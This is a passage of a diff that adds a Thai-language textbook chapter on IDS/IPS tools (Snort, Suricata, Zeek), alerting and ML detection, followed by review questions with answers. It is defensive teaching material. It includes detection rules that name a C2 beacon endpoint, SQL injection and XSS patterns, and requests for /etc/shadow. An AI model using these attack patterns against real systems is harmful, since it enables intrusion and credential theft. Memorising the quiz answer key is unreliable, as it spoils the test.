+    <tr><td><code>frag3</code></td><td>IP Fragmentation Reassembly</td></tr>
+    <tr><td><code>stream5</code></td><td>TCP Stream Reassembly, State Tracking</td></tr>
+    <tr><td><code>http_inspect</code></td><td>HTTP Normalization, De-obfuscation</td></tr>
+    <tr><td><code>ssl_preprocessor</code></td><td>ตรวจสอบ SSL/TLS Handshake</td></tr>
+    <tr><td><code>smtp_preprocessor</code></td><td>ตรวจสอบ SMTP Command</td></tr>
+    <tr><td><code>dns_preprocessor</code></td><td>ตรวจสอบ DNS Query/Response</td></tr>
+    <tr><td><code>portscan</code></td><td>ตรวจจับ Port Scan</td></tr>
+    <tr><td><code>arp_spoof</code></td><td>ตรวจจับ ARP Spoofing</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section7-4" class="section-ref">7.4 การติดตั้งและการกำหนดค่าพื้นฐาน</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button># ติดตั้ง Snort บน Ubuntu/Debian
+sudo apt-get install snort
+
+# ไฟล์ config หลัก: /etc/snort/snort.conf
+# ไฟล์ rules: /etc/snort/rules/
+
+# ทดสอบ Snort Configuration
+sudo snort -T -c /etc/snort/snort.conf
+
+# รัน Snort ในโหมด NIDS
+sudo snort -q -A console -c /etc/snort/snort.conf -i eth0
+
+# รัน Snort ในโหมด IPS (Inline)
+sudo snort -Q -c /etc/snort/snort.conf -i eth0:eth1</pre>
+
+<h3 id="section7-5" class="section-ref">7.5 การจัดการ Rule Set</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Rule Set</th><th>แหล่งที่มา</th><th>จำนวน Rule</th><th>ค่าใช้จ่าย</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Community Rules</strong></td><td>snort.org</td><td>~3,000</td><td>ฟรี</td></tr>
+    <tr><td><strong>Registered Rules</strong></td><td>snort.org (สมัครฟรี)</td><td>~10,000</td><td>ฟรี</td></tr>
+    <tr><td><strong>Subscriber Rules</strong></td><td>Talos Intelligence</td><td>~20,000+</td><td>จ่ายเงิน</td></tr>
+    <tr><td><strong>Emerging Threats (ET)</strong></td><td>proofpoint.com</td><td>~30,000+</td><td>ฟรี/Pro</td></tr>
+    <tr><td><strong>ET Pro</strong></td><td>proofpoint.com</td><td>~35,000+</td><td>จ่ายเงิน</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<section id="section8" class="section-ref">
+<h2>8. Suricata</h2>
+
+<h3 id="section8-1" class="section-ref">8.1 ภาพรวม</h3>
+<p>Suricata คือ Open Source IDS/IPS/NSM Engine ที่พัฒนาโดย OISF (Open Information Security Foundation) ในปี 2010 ออกแบบมาเพื่อใช้ประโยชน์จาก Multi-threading และ Hardware Acceleration</p>
+
+<h3 id="section8-2" class="section-ref">8.2 ข้อแตกต่างระหว่าง Snort และ Suricata</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>คุณสมบัติ</th><th>Snort</th><th>Suricata</th></tr></thead>
+  <tbody>
+    <tr><td>Multi-threading</td><td>❌ (Single Thread)</td><td>✅ (Multi-thread — Auto Scaling)</td></tr>
+    <tr><td>GPU Acceleration</td><td>❌</td><td>✅ (CUDA, OpenCL)</td></tr>
+    <tr><td>Protocol Detection</td><td>ต้องใช้ Preprocessor</td><td>✅ Built-in (HTTP, DNS, TLS, SMB, FTP)</td></tr>
+    <tr><td>IP Reputation</td><td>❌</td><td>✅ Built-in</td></tr>
+    <tr><td>File Extraction</td><td>จำกัด</td><td>✅ Full</td></tr>
+    <tr><td>Lua Scripting</td><td>❌</td><td>✅</td></tr>
+    <tr><td>JSON Output</td><td>ผ่าน Plugin</td><td>✅ Native</td></tr>
+    <tr><td>PF_RING/AF_PACKET</td><td>จำกัด</td><td>✅ รองรับดี</td></tr>
+    <tr><td>Performance (10Gbps+)</td><td>ต้อง Tuning มาก</td><td>✅ รองรับดีกว่า</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section8-3" class="section-ref">8.3 สถาปัตยกรรม Suricata</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>                           Suricata Engine
+┌──────────────────────────────────────────────────────────────┐
+│  ┌──────────┐  ┌─────────────┐  ┌──────────┐  ┌──────────┐ │
+│  │ Receive   │  │ Decode +    │  │ Detect   │  │ Output   │ │
+│  │ Packets   │─▶│ Stream/App  │─▶│ Engine   │─▶│ (JSON,   │ │
+│  │ (Multi)   │  │ Layer       │  │ (Multi)  │  │  Eve)    │ │
+│  └──────────┘  └─────────────┘  └──────────┘  └──────────┘ │
+│        │              │              │              │        │
+│  AF_PACKET/    HTTP, DNS, TLS,   Hyperscan/       eve.json │
+│  PF_RING       SMB, FTP Parser   Pattern Match              │
+│  (Multi Queue)                                            │
+└──────────────────────────────────────────────────────────────┘</pre>
+
+<h3 id="section8-4" class="section-ref">8.4 การติดตั้งและการใช้งาน Suricata</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button># ติดตั้ง Suricata บน Ubuntu/Debian
+sudo add-apt-repository ppa:oisf/suricata-stable
+sudo apt-get update
+sudo apt-get install suricata
+
+# ไฟล์ config: /etc/suricata/suricata.yaml
+# Rule path: /etc/suricata/rules/
+
+# ทดสอบ config
+sudo suricata -T -c /etc/suricata/suricata.yaml
+
+# รัน Suricata (IDS Mode)
+sudo suricata -c /etc/suricata/suricata.yaml -i eth0
+
+# ดูผลลัพธ์แบบ Real-time (eve.json)
+sudo tail -f /var/log/suricata/eve.json | jq 'select(.alert) | {timestamp, signature, src_ip, dest_ip}'
+
+# อัปเดต Rules
+sudo suricata-update
+sudo suricata-update enable-source et/open
+sudo systemctl restart suricata</pre>
+
+<h3 id="section8-5" class="section-ref">8.5 Suricata Rule (คล้าย Snort แต่เพิ่มเติม)</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>alert http $HOME_NET any -> $EXTERNAL_NET any (
+    msg:"ET MALWARE Possible C2 Beacon";
+    flow:to_server,established;
+    content:"/gate.php"; http_uri;
+    content:"host="; http_client_body;
+    content:"pass="; http_client_body;
+    pcre:"/^host=[a-z0-9]{16,32}$/Pi";
+    pcre:"/^pass=[a-f0-9]{32}$/Pi";
+    sid:2834721; rev:3;
+    classtype:trojan-activity;
+)</pre>
+</section>
+<hr>
+
+<section id="section9" class="section-ref">
+<h2>9. Zeek (เดิมชื่อ Bro)</h2>
+
+<h3 id="section9-1" class="section-ref">9.1 ภาพรวม</h3>
+<p>Zeek คือ Network Security Monitoring (NSM) Framework ที่พัฒนาโดย Lawrence Berkeley National Laboratory แตกต่างจาก Snort/Suricata ตรงที่ Zeek ไม่ได้เป็น IDS ในความหมายเดิม — แต่เป็น <strong>Event-driven Network Analysis Framework</strong> ที่เน้นการบันทึกและวิเคราะห์ Network Activity มากกว่าการ Match Pattern</p>
+
+<h3 id="section9-2" class="section-ref">9.2 สถาปัตยกรรม Zeek</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>                   Zeek Framework
+┌──────────────────────────────────────────────────────┐
+│  ┌──────────────┐         ┌──────────────┐           │
+│  │ Event Engine  │         │  Policy       │          │
+│  │ (C++)         │────────▶│  Script       │          │
+│  │               │  Events │  Interpreter  │          │
+│  │ - Libpcap     │         │  (Bro Script) │          │
+│  │ - Stream      │         │              │          │
+│  │ - Protocol    │         │ - conn.log   │          │
+│  │   Parsers     │         │ - http.log   │          │
+│  └──────────────┘         │ - dns.log     │          │
+│                            │ - ssl.log     │          │
+│                            │ - files.log   │          │
+│                            └──────────────┘          │
+└──────────────────────────────────────────────────────┘</pre>
+
+<h3 id="section9-3" class="section-ref">9.3 ความแตกต่างระหว่าง Zeek และ Snort/Suricata</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>คุณสมบัติ</th><th>Snort/Suricata</th><th>Zeek</th></tr></thead>
+  <tbody>
+    <tr><td>แนวคิดหลัก</td><td>Signature Matching</td><td>Event Analysis & Logging</td></tr>
+    <tr><td>ภาษา Rule</td><td>Rule Language</td><td>Bro Script (Turing-complete)</td></tr>
+    <tr><td>Output</td><td>Alert เป็นหลัก</td><td>Log ทุกกิจกรรม + Alert</td></tr>
+    <tr><td>Stateful Protocol</td><td>จำกัด</td><td>✅ สมบูรณ์</td></tr>
+    <tr><td>การวิเคราะห์</td><td>Real-time Pattern Match</td><td>Real-time Event + Offline Analysis</td></tr>
+    <tr><td>ความสามารถ Script</td><td>จำกัด</td><td>สูง (ภาษาโปรแกรมมิ่ง)</td></tr>
+    <tr><td>Forensic Capability</td><td>ต่ำ (แค่ Alert)</td><td>สูง (Log รายละเอียดทุกอย่าง)</td></tr>
+    <tr><td>การ Integrate</td><td>ง่าย (Alert → SIEM)</td><td>ต้องพัฒนา Script</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section9-4" class="section-ref">9.4 Zeek Logs</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button># conn.log — ทุก Connection ที่เกิดขึ้น
+172.16.0.8  53322   192.168.1.100 80   tcp   http   1200  3500   SF   ...
+
+# http.log — ทุก HTTP Request
+GET   /index.php    HTTP/1.1    200   OK   Mozilla/5.0   ...
+
+# dns.log — ทุก DNS Query
+example.com   A    192.0.2.1    TTL=3600   ...
+
+# ssl.log — ทุก TLS Handshake
+server.com    TLSv1.3    TLS_AES_256_GCM_SHA384   valid   ...
+
+# files.log — ทุกไฟล์ที่ส่งผ่านเครือข่าย
+image.jpg   image/jpeg    MD5=...   SHA1=...</pre>
+
+<h3 id="section9-5" class="section-ref">9.5 ตัวอย่าง Zeek Script</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button># ตรวจจับ HTTP Request ที่มี SQL Injection Patterns
+event http_request(c: connection, method: string, original_URI: string,
+                   unescaped_URI: string, version: string) {
+    
+    # SQL Injection Patterns
+    local sql_patterns = /SELECT|UNION|DROP|INSERT|DELETE|--/;
+    # XSS Patterns
+    local xss_patterns = /<script|<iframe|onerror|onload/;
+    
+    if (sql_patterns in unescaped_URI) {
+        NOTICE([$note=SQL_Injection,
+                $msg=fmt("SQL Injection detected: %s", unescaped_URI),
+                $conn=c]);
+    }
+    
+    if (xss_patterns in unescaped_URI) {
+        NOTICE([$note=XSS_Attack,
+                $msg=fmt("XSS detected: %s", unescaped_URI),
+                $conn=c]);
+    }
+}</pre>
+</section>
+<hr>
+
+<section id="section10" class="section-ref">
+<h2>10. การแจ้งเตือน การตอบสนอง และ AI ใน IDS/IPS</h2>
+
+<h3 id="section10-1" class="section-ref">10.1 แนวคิดการแจ้งเตือน</h3>
+<p>การแจ้งเตือนที่มีประสิทธิภาพต้องคำนึงถึง:</p>
+<p><strong>1. ลำดับความสำคัญ (Priority):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>CRITICAL (P1):  การโจมตีที่กำลังดำเนินการ — ต้องตอบสนองทันที
+HIGH (P2):      การโจมตีที่อาจสำเร็จ — ต้องตรวจสอบภายใน 1 ชม.
+MEDIUM (P3):    การสแกนหรือ Recon — ตรวจสอบภายใน 24 ชม.
+LOW (P4):       Policy Violation, Anomaly — ตรวจสอบตามปกติ</pre>
+<p><strong>2. การลด False Positive:</strong></p>
+<ul>
+  <li>ใช้ Thresholding — แจ้งเตือนเฉพาะเมื่อเหตุการณ์เกิดซ้ำ N ครั้งในเวลา T</li>
+  <li>ใช้ Whitelist — ไม่แจ้งเตือน Traffic จาก Source ที่เชื่อถือได้</li>
+  <li>ใช้ Correlation — ต้องมีหลายเงื่อนไขประกอบกันจึงแจ้งเตือน</li>
+  <li>ใช้ TI (Threat Intelligence) Feed — ตรวจสอบเฉพาะ IP ที่มี Reputation ไม่ดี</li>
+</ul>
+<p><strong>3. การส่ง Alert:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Alert Pipeline:
+───────────────
+IDS/IPS → Syslog/JSON → SIEM (Splunk, ELK, QRadar)
+                        → Ticketing (ServiceNow, Jira)
+                        → Notification (Email, Slack, PagerDuty)
+                        → SOAR Playbook (ตอบสนองอัตโนมัติ)</pre>
+
+<h3 id="section10-2" class="section-ref">10.2 การตอบสนองอัตโนมัติ (Automated Response)</h3>
+<p><strong>SOAR (Security Orchestration, Automation and Response):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>SOAR Playbook — Ransomware Response:
+─────────────────────────────────────
+Trigger: 🚨 IDS Alert — Ransomware File Extension Detected
+Step 1:  🔍 Isolate infected host (via NAC/EDR API)
+Step 2:  🛑 Block C2 IP on Firewall (via API)
+Step 3:  📸 Snapshot memory and disk (for forensics)
+Step 4:  📧 Notify IR team via PagerDuty
+Step 5:  📝 Create ticket in ServiceNow (Critical Priority)
+Step 6:  📊 Update SIEM with case metadata</pre>
+
+<h3 id="section10-3" class="section-ref">10.3 AI และ Machine Learning ใน IDS/IPS</h3>
+<p><strong>บทบาทของ AI/ML:</strong></p>
+<div class="table-wrap"><table>
+  <thead><tr><th>เทคนิค</th><th>การประยุกต์ใช้</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Supervised Learning (Random Forest, XGBoost)</strong></td><td>แยกประเภท Traffic ว่า Normal หรือ Attack</td></tr>
+    <tr><td><strong>Unsupervised Learning (K-Means, Autoencoder)</strong></td><td>ตรวจจับ Anomaly โดยไม่ต้องมี Label Data</td></tr>
+    <tr><td><strong>Deep Learning (CNN, LSTM)</strong></td><td>วิเคราะห์ Network Flow เป็น Sequence</td></tr>
+    <tr><td><strong>Reinforcement Learning</strong></td><td>ปรับ Threshold แบบ Adaptive</td></tr>
+    <tr><td><strong>NLP (Natural Language Processing)</strong></td><td>วิเคราะห์ HTTP Payload และ DNS Query</td></tr>
+  </tbody>
+</table></div>
+<p><strong>ตัวอย่าง AI Detection Pipeline:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Network Traffic
+      │
+      ▼
+┌─────────────┐
+│ Feature      │  ← Flow Features: Packet Size, IAT, Duration
+│ Extraction   │     Statistical: Mean, SD, Entropy
+└──────┬──────┘
+       ▼
+┌─────────────┐
+│ Preprocessing│  ← Normalize, Scale, Encode
+└──────┬──────┘
+       ▼
+┌─────────────┐
+│ ML Model     │  ← e.g., Random Forest Classifier
+│ Inference    │     (Trained on CIC-IDS-2017 Dataset)
+└──────┬──────┘
+       ▼
+┌─────────────┐
+│ Decision     │  ← Score > 0.85 → Attack: Alert + Block
+│ Threshold    │     Score 0.5-0.85 → Suspicious: Log + Investigate
+└─────────────┘</pre>
+<p><strong>ข้อควรระวังของ AI/ML:</strong></p>
+<ul>
+  <li><strong>Adversarial ML:</strong> ผู้โจมตีสร้าง Input ที่หลอก Model ได้</li>
+  <li><strong>Concept Drift:</strong> พฤติกรรมเครือข่ายเปลี่ยนแปลงตลอดเวลา — ต้อง Retrain</li>
+  <li><strong>Explainability:</strong> ทำไม Model ถึงบอกว่า Traffic นี้ผิดปกติ? (XAI)</li>
+  <li><strong>Resource Intensive:</strong> ต้องใช้ GPU สำหรับ Deep Learning</li>
+</ul>
+</section>
+<hr>
+
+<section id="summary" class="section-ref">
+<h2><i class="fas fa-list-check" aria-hidden="true"></i> สรุปท้ายบท (Chapter Summary)</h2>
+<ol>
+  <li><strong>IDS vs IPS:</strong> IDS ตรวจสอบและแจ้งเตือน (Passive), IPS ตรวจสอบและบล็อก (Inline) — ทั้งคู่ทำงานร่วมกับ Firewall เพื่อ Defense in Depth</li>
+  <li><strong>ประเภท IDS/IPS:</strong> NIDS/NIPS (เครือข่าย), HIDS/HIPS (โฮสต์), WIDS/WIPS (ไร้สาย), NBA (พฤติกรรมเครือข่าย) — แต่ละประเภทมีข้อดีข้อเสียต่างกัน ควรใช้ร่วมกัน</li>
+  <li><strong>เทคนิคการตรวจจับ 3 แบบ:</strong> Signature-based (แม่นยำแต่ตรวจจับ Zero-Day ไม่ได้), Anomaly-based (ตรวจจับสิ่งใหม่ได้แต่ False Positive สูง), Stateful Protocol Analysis (เข้าใจ Protocol Context)</li>
+  <li><strong>การหลบเลี่ยงการตรวจจับ:</strong> ผู้โจมตีใช้ Fragmentation, Encoding, Encryption, และ Protocol Obfuscation — IDS/IPS ต้องมี Reassembly, Normalization, และ Decryption</li>
+  <li><strong>เครื่องมือหลัก:</strong> Snort (Single-thread, Enterprise Standard), Suricata (Multi-thread, Performance สูง), Zeek (Event-driven Analysis, Logging ละเอียด)</li>
+  <li><strong>การตอบสนอง:</strong> ใช้ SOAR สำหรับ Automated Response, ใช้ AI/ML สำหรับตรวจจับ Anomaly ขั้นสูง</li>
+</ol>
+</section>
+<hr>
+
+<section id="review-questions" class="section-ref">
+<h2><i class="fas fa-question-circle" aria-hidden="true"></i> คำถามทบทวน (Review Questions)</h2>
+<p style="color:var(--text-secondary);margin-bottom:1.5rem;">คลิกปุ่ม <strong>"ดูเฉลย"</strong> เพื่อเปิดคำตอบ</p>
+
+<div class="quiz-card" data-question="1">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 1</span>
+    <p>จงอธิบายความแตกต่างระหว่าง IDS และ IPS ในด้านตำแหน่งการวาง, โหมดการทำงาน, และผลกระทบต่อเครือข่าย พร้อมยกตัวอย่างสถานการณ์ที่ควรเลือกใช้แต่ละแบบ</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> IDS (Intrusion Detection System) ทำงานในโหมด Passive — วางตำแหน่งแบบ Out-of-Band (SPAN/TAP) รับสำเนา Traffic ตรวจสอบและแจ้งเตือนแต่ไม่บล็อก มี Latency ไม่เพิ่ม ไม่มีผลกระทบต่อเครือข่ายเมื่อทำงานผิดพลาด (False Positive แค่แจ้งเตือน) เหมาะกับเครือข่ายที่ต้องการ Monitoring และ Forensic ส่วน IPS (Intrusion Prevention System) ทำงานในโหมด Inline — วางตำแหน่งในเส้นทาง Traffic จริง ตรวจสอบและบล็อกการโจมตีแบบ Real-time มี Latency เพิ่มขึ้นได้ การทำงานผิดพลาดอาจบล็อก Traffic ปกติ เหมาะกับเครือข่ายที่ต้องการป้องกันอัตโนมัติและมีข้อกำหนดด้าน Compliance</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="2">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 2</span>
+    <p>หากองค์กรของคุณต้องเลือกระหว่าง NIDS และ HIDS เพียงอย่างเดียว คุณจะเลือกแบบไหน เพราะเหตุใด จงอธิบายข้อดีข้อเสีย</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> ควรเลือก NIDS (Network-based IDS) ก่อน เพราะ (1) ครอบคลุม Traffic ทั้ง Segment โดยไม่ต้องติดตั้ง Agent ทุกเครื่อง (2) ติดตั้งง่าย — ใช้ SPAN Port บน Switch เพียงจุดเดียว (3) ไม่ส่งผลกระทบต่อประสิทธิภาพของระบบที่ตรวจสอบ (4) ตรวจจับการโจมตีระดับ Network Protocol และการโจมตีที่มุ่งเป้าสู่หลายระบบพร้อมกันได้ ข้อเสีย: ไม่เห็น Traffic ที่เข้ารหัส (HTTPS, VPN) และไม่เห็นกิจกรรมภายในโฮสต์ อย่างไรก็ตาม ทางที่ดีควรใช้ทั้ง NIDS และ HIDS ร่วมกันเพื่อ Defense in Depth</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="3">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 3</span>
+    <p>จงเปรียบเทียบ Signature-based Detection และ Anomaly-based Detection ในแง่ของความแม่นยำ, การตรวจจับ Zero-Day, False Positive Rate, และ Resource ที่ใช้</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>Signature-based Detection:</strong> ความแม่นยำสูงสำหรับการโจมตีที่รู้จัก (False Positive ต่ำ), ไม่สามารถตรวจจับ Zero-Day Attack ได้, ใช้ Resource น้อย (Pattern Matching), ง่ายต่อการอัปเดต <strong>Anomaly-based Detection:</strong> ความแม่นยำปานกลาง (False Positive สูง — การเปลี่ยนแปลงปกติอาจถูกตีความเป็น Anomaly), ตรวจจับ Zero-Day และ Novel Attack ได้, ใช้ Resource มาก (ต้องสร้าง Baseline และวิเคราะห์ต่อเนื่อง), มีความเสี่ยง Concept Drift และ Slow Drip Evasion แนวทางที่ดีที่สุดในปัจจุบันคือการใช้ทั้งสองเทคนิคร่วมกัน — Signature-based สำหรับการโจมตีที่รู้จัก, Anomaly-based สำหรับการตรวจจับพฤติกรรมแปลกปลอม</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="4">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 4</span>
+    <p>จงเขียน Snort Rule เพื่อตรวจจับ HTTP Request ที่มี `/etc/shadow` ใน URI พร้อมอธิบายส่วนประกอบแต่ละส่วนของ Rule</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> ตัวอย่าง Snort Rule:<br><code>alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"Path Traversal - /etc/shadow"; content:"/etc/shadow"; http_uri; nocase; flow:to_server,established; sid:1000005; rev:1; classtype:web-application-attack;)</code><br><strong>ส่วนประกอบ:</strong> <code>alert</code> = Action แจ้งเตือน, <code>tcp</code> = Protocol, <code>$EXTERNAL_NET any</code> = Source จากเครือข่ายภายนอก, <code>$HTTP_SERVERS $HTTP_PORTS</code> = ไปยัง Web Server, <code>msg</code> = ข้อความแจ้งเตือน, <code>content:"/etc/shadow"</code> = Pattern ที่ค้นหา, <code>http_uri</code> = ค้นหาใน URI, <code>nocase</code> = ไม่สนใจตัวพิมพ์, <code>flow:to_server,established</code> = ตรวจสอบเฉพาะ Traffic ที่ส่งไป Server และ Connection สถาปนาแล้ว, <code>sid</code> = Signature ID, <code>rev</code> = Revision</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="5">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 5</span>
+    <p>ผู้โจมตีใช้เทคนิคอะไรในการหลบเลี่ยง IDS/IPS บ้าง จงอธิบาย Fragmentation, Encoding, และ Encryption พร้อมแนวทางการป้องกันแต่ละเทคนิค</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> (1) <strong>Fragmentation:</strong> แบ่ง Payload ออกเป็น Fragment ย่อย — ป้องกันโดย IDS/IPS ต้องทำ IP Reassembly (Snort: frag3) และ TCP Reassembly (stream5) ก่อนตรวจสอบ (2) <strong>Encoding:</strong> แปลง Payload เป็นรูปแบบอื่น (Hex, URL, Unicode, Base64, UTF-16) — ป้องกันโดยใช้ Normalization Engine แปลง Encoding กลับเป็นรูปแบบปกติ (Snort: http_inspect, Suricata: http.request_uri) (3) <strong>Encryption:</strong> เข้ารหัส Traffic เพื่อซ่อน Content (HTTPS, SSH, VPN) — ป้องกันโดยใช้ SSL Forward Proxy เพื่อถอดรหัสและตรวจสอบ (ต้องติดตั้ง CA องค์กร), Traffic Metadata Analysis (JA3 Fingerprint), หรือใช้ HIDS ที่มองเห็น Traffic หลังจาก Decryption บน Endpoint</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="6">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 6</span>
+    <p>จงอธิบายความแตกต่างระหว่าง Snort, Suricata, และ Zeek ในแง่ของสถาปัตยกรรม, ความสามารถ, และกรณีการใช้งานที่เหมาะสม</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>Snort:</strong> สถาปัตยกรรมแบบ Single-thread — ใช้ Decode → Preprocessor → Detection → Output, เหมาะกับเครือข่ายความเร็วไม่สูงมาก (< 1 Gbps), เป็นมาตรฐาน IDS ที่ใช้กันแพร่หลายที่สุด, มี Preprocessors สำหรับ Reassembly/Normalization <strong>Suricata:</strong> สถาปัตยกรรมแบบ Multi-thread (Auto Scaling) — รองรับ GPU Acceleration, Protocol Detection Built-in (HTTP, DNS, TLS, SMB, FTP), IP Reputation, File Extraction, Native JSON Output, เหมาะกับเครือข่ายความเร็วสูง (10 Gbps+) <strong>Zeek:</strong> ไม่ใช่ IDS ในความหมายเดิม — เป็น Event-driven Framework แบบ Event Engine (C++) + Policy Script Interpreter, เน้น Logging ละเอียด (conn.log, http.log, dns.log, ssl.log, files.log), ใช้ Bro Script ที่เป็น Turing-complete, เหมาะกับ Forensic และ Analysis มากกว่า Real-time Blocking</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="7">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 7</span>
+    <p>UEBA (User and Entity Behavior Analytics) คืออะไร และแตกต่างจาก Signature-based Detection อย่างไร จงยกตัวอย่างพฤติกรรมที่ UEBA สามารถตรวจจับได้</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> UEBA (User and Entity Behavior Analytics) คือเทคนิค Anomaly Detection ที่มุ่งเน้นพฤติกรรมของผู้ใช้และอุปกรณ์ โดยสร้าง Baseline ของพฤติกรรมปกติ (เวลา Login ปกติ, สถานที่, อุปกรณ์, ข้อมูลที่เข้าถึงเป็นประจำ) และแจ้งเตือนเมื่อมีพฤติกรรมเบี่ยงเบน แตกต่างจาก Signature-based Detection ที่ใช้ Pattern Matching กับ Attack ที่รู้จัก — UEBA ตรวจจับพฤติกรรมที่ผิดปกติโดยไม่ต้องรู้จัก Attack มาก่อน ตัวอย่างพฤติกรรมที่ UEBA ตรวจจับได้: (1) ผู้ใช้ HR Login เข้า DB Server เวลา 03:14 น. เป็นครั้งแรก (2) ผู้ใช้ Login จาก Tor Exit Node (3) การเข้าถึงข้อมูลที่ไม่เคยเข้าถึงมาก่อน (4) Lateral Movement — Login ไปยังระบบต่างๆ ต่อเนื่อง (5) Privilege Escalation — การใช้สิทธิ์ที่สูงขึ้นผิดปกติ (6) Data Exfiltration — การดาวน์โหลดข้อมูลปริมาณมากผิดปกติ</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="8">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 8</span>
+    <p>ในองค์กรที่มี Traffic วันละ 500 Gbps จงอธิบายความท้าทายในการใช้งาน IDS/IPS และเสนอแนวทางแก้ไข (รวมถึง Hardware Sizing, Rule Management, และ Monitoring)</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>ความท้าทาย:</strong> (1) Performance — IDS/IPS แบบ Single-thread (Snort) ไม่สามารถรองรับ Traffic ระดับ 500 Gbps ได้ (2) Hardware Sizing — ต้องใช้ Appliance เฉพาะหรือ Suricata ที่รองรับ Multi-threading และ GPU Acceleration (3) Rule Management — Rule Set ขนาดใหญ่ (>30,000 rules) ทำให้ Detection Engine ช้าลง (4) False Positive — Alert จำนวนมาก淹没ทีม SOC <strong>แนวทางแก้ไข:</strong> (1) ใช้ Suricata ที่รองรับ Multi-thread + PF_RING/AF_PACKET (2) ใช้ Network TAP + Load Balancer แบ่ง Traffic ไปยัง Sensor หลายตัว (3) ใช้ Hardware Acceleration (FPGA, NVIDIA GPU) (4) จัดลำดับความสำคัญ Rule — ใช้ Rule ที่สำคัญก่อน (5) ใช้ Thresholding และ Whitelist เพื่อลด False Positive (6) ใช้ SIEM ในการ Correlate Alert (7) ใช้ Network Sampling (sFlow, NetFlow) สำหรับการวิเคราะห์ภาพรวมร่วมกับ Full Packet Inspection เฉพาะ Traffic ที่น่าสงสัย</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="9">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 9</span>
+    <p>จงอธิบายบทบาทของ AI และ Machine Learning ใน IDS/IPS สมัยใหม่ พร้อมยกตัวอย่างเทคนิคและข้อจำกัด</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
